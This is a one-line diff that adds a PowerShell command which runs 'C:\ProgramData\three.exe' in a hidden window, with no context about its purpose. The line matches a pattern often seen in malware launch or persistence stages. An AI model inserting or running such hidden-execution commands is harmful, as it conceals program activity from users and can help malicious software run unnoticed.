@@ -1,0 +1,1 @@
+Start-Process powershell -ArgumentList "C:\ProgramData\three.exe" -WindowStyle hidden
